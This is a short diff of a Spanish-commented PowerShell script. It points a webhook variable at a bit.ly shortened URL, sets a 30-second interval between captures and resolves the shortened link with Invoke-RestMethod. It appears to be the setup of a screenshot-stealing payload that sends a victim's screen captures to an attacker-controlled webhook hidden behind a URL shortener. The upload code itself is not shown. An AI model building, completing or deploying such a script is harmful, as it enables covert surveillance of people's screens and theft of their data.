@@ -1,9 +1,9 @@
-$hookurl = "$dc"
+$hookurl = "https://bit.ly/web_chupakbras"
 $seconds = 30 # Intervalo entre capturas
 $a = 1 # Cantidad de capturas
 
 # Detección de URL acortada
-if ($hookurl.Ln -ne 121){Write-Host "Shortened Webhook URL Detected..ll." ; $hookurl = (irm $hookurl).url}
+if ($hookurl.Ln -ne 121){Write-Host "Shortened Webhook URL Detected..222." ; $hookurl = (irm $hookurl).url}
 
 # Ubicación del script
 $scriptPath = $MyInvocation.MyCommand.Path
